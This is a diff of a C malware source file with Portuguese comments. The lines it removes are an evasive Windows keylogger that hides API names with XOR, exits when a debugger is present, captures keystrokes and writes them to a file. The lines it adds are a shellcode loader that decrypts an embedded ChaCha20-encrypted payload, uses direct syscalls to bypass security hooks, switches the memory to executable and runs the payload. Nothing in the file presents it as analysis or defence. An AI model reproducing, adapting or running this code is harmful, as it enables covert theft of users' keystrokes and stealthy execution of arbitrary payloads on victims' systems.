@@ -19,215 +19,186 @@ void *memcpy(void *dest, const void* src, size_t len) {
 int __stdio_common_vsprintf() { return 0; }
 
 #include "./include/peb_walker.h"
-#include "./include/asm_io.h"
-#define ACC_SIZE 100
+#include "./include/chacha20.h"
 
-short is_down(int keystroke, void* get_async_addr) {
-    short pressed;
+void* alloc_mem(uint32_t ssn, uint64_t align, uint64_t size, uint64_t type, uint64_t protect) {
+    void* base_addr = 0;
+    uint64_t region_size = size;
+    uint32_t status;
 
     __asm__ __volatile__ (
-        "pushq %%rbp\n"             // Saves rbp
-        "movq %%rsp, %%rbp\n"       // Creates stack frame
-        "andq $-16, %%rsp\n"        // Aligns stack pointer
-        "subq $32, %%rsp\n"         // Shadows space
-        "movl %2, %%ecx\n"          // Loads the keystroke inside ecx
-        "call *%1\n"                // Calls GetAsyncKeyState
-        "movq %%rbp, %%rsp\n"       // Restores RSP
-        "popq %%rbp\n"              // Restores RBP
-        "movw %%ax, %0\n"          // Moves the current key state from ax to pressed
-        : "=r" (pressed)
-        : "r" (get_async_addr), "r" (keystroke)
-        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
+        // 1. Preparar os 4 primeiros argumentos nos registros
+        "movq %[prochandle], %%rcx\n"
+        "movq %[pbaseaddr], %%rdx\n" // Passa o ENDEREÇO da variável
+        "movq %[zerobits], %%r8\n"
+        "movq %[psize], %%r9\n"      // Passa o ENDEREÇO da variável
+
+        // 2. Alocar espaço na pilha para os argumentos 5 e 6
+        // O kernel espera o Arg 5 em [RSP+40] e Arg 6 em [RSP+48] durante a syscall
+        "subq $56, %%rsp\n" 
+        "movq %[type], 40(%%rsp)\n"    // 5º arg: AllocationType
+        "movq %[protect], 48(%%rsp)\n" // 6º arg: Protect
+
+        // 3. Preparar a syscall
+        "movq %%rcx, %%r10\n"
+        "movl %[ssn], %%eax\n"
+        "syscall\n"
+
+        // 4. Limpar a pilha
+        "addq $56, %%rsp\n"
+        : "=a"(status)
+        : [ssn] "r"(ssn),
+        [prochandle] "r"((void*)-1),
+        [pbaseaddr] "r"(&base_addr),   // NT exige ponteiro
+        [zerobits] "r"(align),
+        [psize] "r"(&region_size),     // NT exige ponteiro
+        [type] "r"(type),            // MEM_COMMIT | MEM_RESERVE
+        [protect] "r"(protect)            // PAGE_EXECUTE_READWRITE
+        : "rcx","rdx","r8","r9","r10","r11","memory"
     );
 
-    return pressed;
+    return (status == 0) ? base_addr : 0;
 }
 
-int to_unicode(uint32_t wVirtKey, uint32_t wScanCode, const uint8_t* lpKeyState, uint16_t* pwszBuff, int cchBuff, uint32_t wFlags, void* to_unicode_addr) {
-    int result;
+uint32_t free_mem(uint32_t ssn, void* address, size_t size, uint32_t free_type) {
+    uint32_t status;
+    void* base_addr = address;
+    uint64_t region_size = size;
+
+    // Se for MEM_RELEASE (0x8000), region_size DEVE ser 0
+    if (free_type == 0x8000) {
+        region_size = 0;
+    }
 
     __asm__ __volatile__ (
-        "pushq %%rbp\n\t"
-        "movq %%rsp, %%rbp\n\t"
-        "andq $-16, %%rsp\n\t"          // Alinhamento crucial
-        "subq $48, %%rsp\n\t"           // 32 (shadow) + 16 (args 5 e 6)
+        "subq $40, %%rsp\n"          // 32 bytes (shadow) + 8 bytes (alinhamento)
 
-        "movq %[state], %%r8\n\t"       // Arg 3: lpKeyState
-        "movq %[buff], %%r9\n\t"        // Arg 4: pwszBuff
-        
-        // Importante: ToUnicode espera 32-bit (int) na pilha para cchBuff
-        "movl %[cch], %%eax\n\t"        
-        "movl %%eax, 32(%%rsp)\n\t"     // Offset 32: cchBuff
-        
-        "movl %[flags], %%eax\n\t"      
-        "movl %%eax, 40(%%rsp)\n\t"     // Offset 40: wFlags
-        
-        "call *%[addr]\n\t"             
-        "movl %%eax, %[res]\n\t"        
-        
-        "leave\n\t"
-        : [res] "=r" (result)
-        : [vk] "c" (wVirtKey),              // Arg 1: RCX
-        [sc] "d" (wScanCode),          // Arg 2: RDX
-        [state] "r" (lpKeyState),
-        [buff] "r" (pwszBuff),
-        [cch] "er" (2),               // Tamanho do buffer (2)
-        [flags] "er" (0),             // Flags (0)
-        [addr] "r" (to_unicode_addr)
-        : "rax", "r8", "r9", "r10", "r11", "memory"
+        "movq %[prochandle], %%r10\n"
+        "movq %[pbaseaddr], %%rdx\n" // Passa o ENDEREÇO da variável que contém o ponteiro
+        "movq %[psize], %%r8\n"      // Passa o ENDEREÇO da variável de tamanho
+        "movl %[freetype], %%r9d\n"
+
+        "movl %[ssn], %%eax\n"
+        "syscall\n"
+
+        "addq $40, %%rsp\n"
+        : "=a"(status)
+        : [ssn] "r"(ssn),
+          [prochandle] "r"((void*)-1),
+          [pbaseaddr] "r"(&base_addr), 
+          [psize] "r"(&region_size),
+          [freetype] "r"(free_type)
+        : "r10", "rdx", "r8", "r9", "r11", "rcx", "memory"
     );
 
-    return result;
+    return status;
 }
 
-void sleep(void* delay_exec_addr, long long duration) {
-    long long interval = duration; 
+uint32_t protect_mem(uint32_t ssn, void* address, size_t size, uint32_t new_protect) {
+    uint32_t status;
+    uint32_t old_protect = 0;
+    void* base_addr = address;
+    uint64_t region_size = (uint64_t)size;
+    void* old_protect_ptr = (void*)&old_protect;
 
     __asm__ __volatile__ (
-        "pushq %%rbp\n"
-        "movq %%rsp, %%rbp\n"
-        "andq $-16, %%rsp\n"
-        "subq $48, %%rsp\n"
+        // Allocate shadow space (32 bytes) + space for 5th argument (8 bytes)
+        "subq $40, %%rsp\n"
         
-        "movq %1, 32(%%rsp)\n"
-        "xorq %%rcx, %%rcx\n"
-        "leaq 32(%%rsp), %%rdx\n"
+        // Setup arguments in registers
+        "movq %[prochandle], %%r10\n"  // Arg 1: Process handle
+        "movq %[pbaseaddr], %%rdx\n"   // Arg 2: BaseAddress pointer
+        "movq %[psize], %%r8\n"        // Arg 3: RegionSize pointer
+        "movl %[newprotect], %%r9d\n"  // Arg 4: NewProtect
         
-        "call *%0\n"
+        // Setup 5th argument (OldProtect pointer) on stack
+        "movq %[oldprotect_ptr], 32(%%rsp)\n"
         
-        "movq %%rbp, %%rsp\n"
-        "popq %%rbp\n"
-        : 
-        : "r" (delay_exec_addr), "r" (interval)
-        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
-    );    
-}
-
-uint32_t mapvirtualkey_func(uint32_t uCode, uint32_t uMapType, void* mapvirtual_addr) {
-    uint32_t result;
-
-    __asm__ __volatile__ (
-        "pushq %%rbp\n\t"
-        "movq %%rsp, %%rbp\n\t"
-        "andq $-16, %%rsp\n\t"    // Alinha em 16
-        "subq $48, %%rsp\n\t"     // 32 (shadow) + 16 (espaço extra para manter alinhamento)
+        // System call
+        "movl %[ssn], %%eax\n"
+        "syscall\n"
         
-        "movl %[code], %%ecx\n\t" // RCX = uCode
-        "movl %[type], %%edx\n\t" // RDX = uMapType
-
-        "call *%[addr]\n\t"       
-        "movl %%eax, %[res]\n\t"  // Resgate o resultado de EAX
-        "leave\n\t"
-        : [res] "=r" (result)
-        : [code] "r" (uCode), 
-        [type] "r" (uMapType), 
-        [addr] "r" (mapvirtual_addr)
-        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
+        "addq $40, %%rsp\n"
+        : "=a"(status)
+        : [ssn] "r"(ssn),
+          [prochandle] "r"((void*)-1),
+          [pbaseaddr] "r"(&base_addr),
+          [psize] "r"(&region_size),
+          [newprotect] "r"(new_protect),
+          [oldprotect_ptr] "r"(old_protect_ptr)
+        : "r10", "rdx", "r8", "r9", "r11", "rcx", "memory"
     );
 
-    return result;
+    return status;
+}
+
+uint32_t flush_mem(uint32_t ssn, void* address, size_t size) {
+    uint32_t status;
+
+    __asm__ __volatile__ (
+        "subq $40, %%rsp\n"          // 32 (shadow) + 8 (alinhamento)
+
+        "movq %[prochandle], %%r10\n" // Arg 1: Handle (-1)
+        "movq %[address], %%rdx\n"    // Arg 2: BaseAddress
+        "movq %[size], %%r8\n"       // Arg 3: Length
+
+        "movl %[ssn], %%eax\n"
+        "syscall\n"
+
+        "addq $40, %%rsp\n"
+        : "=a"(status)
+        : [ssn] "r"(ssn),
+          [prochandle] "r"((void*)-1),
+          [address] "r"(address),
+          [size] "r"((uint64_t)size)
+        : "r10", "rdx", "r8", "r11", "rcx", "memory"
+    );
+
+    return status;
 }
 
 int main() {
     PEB_Scavenger peb = init_scavenger();
+    uint32_t alloc_ssn = get_ssn(peb.NtAllocateVirtualMemory);
+    uint32_t free_ssn = get_ssn(peb.NtFreeVirtualMemory);
+    uint32_t prot_ssn = get_ssn(peb.NtProtectVirtualMemory);
+    uint32_t flush_ssn = get_ssn(peb.NtFlushInstructionCache);
 
-    uint32_t debbuged;
+    unsigned char shellcode[] = { 0x76, 0x23, 0x72, 0xA6, 0xFE, 0x29, 0x52, 0x5B, 0x3E, 0xA9, 0x00, 0xC8, 0x4D, 0xC6, 0x24, 0xC7, 0xD4, 0x38, 0x41, 0xE2, 0xBA, 0x76, 0x1B, 0xC5, 0xF1, 0xB3, 0x83, 0xE7, 0xE5, 0x8C, 0xAB, 0x1A, 0xE2, 0x48, 0x2D, 0x42, 0x6B, 0x08, 0xB1, 0xC2, 0xA7, 0x0F, 0xD9, 0x9D, 0x16, 0x5A, 0xFC, 0xF6, 0xD0, 0x02, 0x1A, 0x78, 0x59, 0x88, 0x9D, 0xBD, 0xEC, 0x2F, 0xB9, 0x9C, 0xA2, 0xE1, 0x18, 0x2B, 0xB5, 0xB3, 0x81, 0x94, 0x7D, 0x0D, 0xAE, 0x3F, 0x57, 0xF8, 0x84, 0x28, 0xA7, 0xC3, 0x94, 0x9D, 0x71, 0xAA, 0xC0, 0x08, 0xC9, 0x45, 0x71, 0x56, 0x65, 0x88, 0xB9, 0x22, 0xDE, 0x8B, 0xDE, 0x8C, 0x19, 0x08, 0xBB, 0x7C, 0xDD, 0x6B, 0x4B, 0xE1, 0x5A, 0xDB, 0x9C, 0xF7, 0x3A, 0x5A, 0x53, 0x3D, 0x6E, 0x35, 0x28, 0x35, 0x87, 0xB9, 0xEC, 0x77, 0x64, 0xCE, 0xDC, 0x3E, 0xF8, 0xCC, 0xCD, 0xA3, 0x57, 0xCC, 0x69, 0x07, 0xC3, 0x8C, 0x96, 0xDA, 0xE4, 0x66, 0xA3, 0xB4, 0xFD, 0x0F, 0xF0, 0xCF, 0x4C, 0x52, 0x6A, 0x99, 0x75, 0xFF, 0xD3, 0x9C, 0xC7, 0x86, 0x40, 0xF2, 0xF9, 0xB6, 0x7C, 0xB2, 0x93, 0xFA, 0xCD, 0xA6, 0x39, 0xF0, 0x55, 0xA2, 0x7B, 0xF5, 0x17, 0xE5, 0x2F, 0x17, 0x90, 0x5E, 0x9E, 0x2D, 0x6B, 0xEA, 0x30, 0xCB, 0x65, 0x90, 0xE9, 0x48, 0x3F, 0x85, 0x12, 0xA7, 0x26, 0x45, 0xFA, 0xE5, 0x1F, 0xAF, 0x01, 0x08, 0x81, 0x9B, 0x04, 0xA5, 0x09, 0x2A, 0xAE, 0xA3, 0x78, 0x76, 0x4F, 0xD8, 0xE6, 0x5B, 0x39, 0xE6, 0x0A, 0x6D, 0xAD, 0xE2, 0xCB, 0xA7, 0x5A, 0x60, 0x45, 0xA0, 0x3F, 0xCB, 0x61, 0x82, 0xED, 0x86, 0xA7, 0xAD, 0xA9, 0xCE, 0xA8, 0xBB, 0x70, 0xB2, 0x1F, 0x56, 0x87, 0x3A, 0xAF, 0xD7, 0xC8, 0xC3, 0xCA, 0xA1, 0x6B, 0x06, 0x01, 0x0F, 0x0F, 0x5B, 0x08, 0xDC, 0x01, 0x22, 0x4C, 0x91, 0x60, 0xDB, 0x13, 0xA4, 0xD7, 0x51, 0xC3, 0x5B, 0xCF, 0xB7, 0x36, 0x2D, 0xAE, 0xEF, 0x82, 0x24, 0x8E, 0xA6, 0x78, 0xBE, 0x66, 0x86, 0xBF, 0x7E, 0x2D, 0x01, 0x18, 0x9C, 0x25, 0x47, 0x9E, 0x70, 0xF2, 0x3B, 0xD9, 0x8A, 0x79, 0x02, 0x04, 0x80, 0xC8, 0x2F, 0x74, 0x03, 0x99, 0xF5, 0x25, 0x37, 0x6E, 0x1E, 0x49, 0xB2, 0xE9, 0x42, 0xE6, 0x14, 0x52, 0x81, 0x1A, 0xED, 0xD3, 0xD1, 0xD0, 0x2D, 0xBC, 0x66, 0x24, 0xF7, 0x87, 0xE7, 0xF6, 0x7A, 0x4C, 0x45, 0x73, 0x2A, 0x44, 0x9A, 0xF1, 0x5C, 0x65, 0x4E, 0x3C, 0xEB, 0x17, 0x90, 0xC6, 0xF7, 0x7E, 0x57  };
 
-    __asm__ __volatile__ (
-        "movq %%gs:0x60, %%rax\n" // RAX = PEB
-        "movl 0xbc(%%rax), %0"
-        : "=r" (debbuged)
-        :
-        : "memory", "%rax"
-    );
+    void* buffer = alloc_mem(alloc_ssn, 0, sizeof(shellcode), 0x3000 , 0x04);
 
-    if(debbuged != 0) {
-        quit(&peb);
-    }
+    uint32_t key[8] = { 4082983619, 3889329055, 2378976225, 3595600982, 2858304340, 67682415, 1356556552, 2242286600 };
+    uint32_t nonce[3] = { 1401676596, 2241564051, 2000661102 };
 
-    unsigned char mixer[32] = {0x3, 0xE, 0xFC, 0x22, 0xE2, 0x2F, 0x25, 0x70, 0x4, 0x7F, 0x1D, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
+    ChaCha20 c = new_chacha(key, nonce);
 
-    unsigned char dllname[32] = {0x76, 0x7D, 0x99, 0x50, 0xD1, 0x1D, 0xB, 0x14, 0x68, 0x13, 0x1D, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
-    unsigned char funcname[32] = {0x44, 0x6B, 0x88, 0x63, 0x91, 0x56, 0x4B, 0x13, 0x4F, 0x1A, 0x64, 0xD4, 0x6A, 0xE8, 0x1C, 0x3D, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
-    unsigned char ntdllname[32] = {0x6D, 0x7A, 0x98, 0x4E, 0x8E, 0x1, 0x41, 0x1C, 0x68, 0x7F, 0x1D, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
-    unsigned char delayexec_name[32] = {0x4D, 0x7A, 0xB8, 0x47, 0x8E, 0x4E, 0x5C, 0x35, 0x7C, 0x1A, 0x7E, 0xF2, 0x6A, 0xE0, 0x7, 0x36, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
-    unsigned char tounicode_name[32] = {0x57, 0x61, 0xA9, 0x4C, 0x8B, 0x4C, 0x4A, 0x14, 0x61, 0x7F, 0x1D, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
-    unsigned char mapvirtual_name[32] = {0x4E, 0x6F, 0x8C, 0x74, 0x8B, 0x5D, 0x51, 0x5, 0x65, 0x13, 0x56, 0xE2, 0x67, 0xDE, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
-    unsigned char createfile_name[32] = {0x4D, 0x7A, 0xBF, 0x50, 0x87, 0x4E, 0x51, 0x15, 0x42, 0x16, 0x71, 0xE2, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
-    unsigned char writefile_name[32] = {0x4D, 0x7A, 0xAB, 0x50, 0x8B, 0x5B, 0x40, 0x36, 0x6D, 0x13, 0x78, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
+    process_chacha20(&c, shellcode, sizeof(shellcode));
 
-    for(int i=0; i < 32; i++) {
-        dllname[i] ^= mixer[i];
-        funcname[i] ^= mixer[i];
-        ntdllname[i] ^= mixer[i];
-        delayexec_name[i] ^= mixer[i];
-        tounicode_name[i] ^= mixer[i];
-        mapvirtual_name[i] ^= mixer[i];
-        createfile_name[i] ^= mixer[i];
-        writefile_name[i] ^= mixer[i];
-    }
+    size_t sc_size = sizeof(shellcode);
 
-    void* user32_dll = getDllAddr(dllname, &peb);
-    void* ntdll_addr = getDllAddr(ntdllname, &peb);
-
-    void* asynckeystate = getDllFunctionAddr(funcname, user32_dll, &peb);
-    void* ntdelayexec = getDllFunctionAddr(delayexec_name, ntdll_addr, &peb);
-    void* ntcreatefile_addr = getDllFunctionAddr(createfile_name, ntdll_addr, &peb);
-    void* ntwritefile_addr = getDllFunctionAddr(writefile_name, ntdll_addr, &peb);
-    void* tounicode = getDllFunctionAddr(tounicode_name, user32_dll, &peb);
-    void* mapvirtualkey = getDllFunctionAddr(mapvirtual_name, user32_dll, &peb);
-
-    void* dumphandle = simple_create_file(ntcreatefile_addr);
-
-    char accumulator[ACC_SIZE];
-    int acc_indx = 0;
-
-    while(1) {
-        for (int vkey = 0; vkey < 256; vkey++) {
-            short state = is_down(vkey, asynckeystate);
-
-            if (state & 0x8000) {
-                if(vkey == 0x14) { // VK_CAPITAL
-                    accumulator[acc_indx++] = 0x14;
-                    if(acc_indx >= ACC_SIZE) {
-                        acc_indx = 0;
-                        simple_write_file(ntwritefile_addr, dumphandle, accumulator, ACC_SIZE);
-                    }
-                    continue;
-                } else if(vkey == 0x08 && acc_indx > 0) {
-                    accumulator[--acc_indx] = 0;
-                    continue;
-                } else if (vkey == 0x0D) { // VK_RETURN
-                    accumulator[acc_indx++] = '\n';
-                    if(acc_indx >= ACC_SIZE) {
-                        acc_indx = 0;
-                        simple_write_file(ntwritefile_addr, dumphandle, accumulator, ACC_SIZE);
-                    }
-                    continue;
-                }
-
-                uint8_t key_state[256];
-                for (int i = 0; i < 256; i++) {
-                    key_state[i] = (is_down(i, asynckeystate) & 0x8000) ? 0x80 : 0;
-                }
-
-                uint16_t buffer[2];
-
-                uint32_t scanCode = mapvirtualkey_func(vkey, 0, mapvirtualkey);
-                int result = to_unicode(vkey, scanCode, key_state, buffer, 2, 0, tounicode);
-
-                if (result > 0) {
-                    accumulator[acc_indx++] = (char)buffer[0];
-                    if(acc_indx >= ACC_SIZE) {
-                        acc_indx = 0;
-                        simple_write_file(ntwritefile_addr, dumphandle, accumulator, ACC_SIZE);
-                    }
-                }
-            }
+    if (buffer) {
+        // 3. Copiar shellcode para o buffer
+        // Se não quiser usar a ntdll!memcpy, pode usar um loop for simples
+        for (int i = 0; i < sc_size; i++) {
+            ((unsigned char*)buffer)[i] = shellcode[i];
         }
 
-        sleep(ntdelayexec, -1000000);
+        // 4. Alterar proteção para Execute/Read (0x20)
+        // O kernel exige RX para rodar código (ou RWX, mas RX é menos suspeito)
+        uint32_t status_prot = protect_mem(prot_ssn, buffer, sc_size, 0x20);
+
+        flush_mem(flush_ssn, buffer, sc_size);
+
+        if (status_prot == 0) {
+            // 5. Executar o shellcode
+            void (*run_sc)() = (void (*)())buffer;
+            run_sc(); 
+        }
+
+        // 6. Liberar a memória após o retorno do shellcode (se ele retornar)
+        free_mem(free_ssn, buffer, 0, 0x8000);
     }
 
-    quit(&peb);
+    return 0;
 }
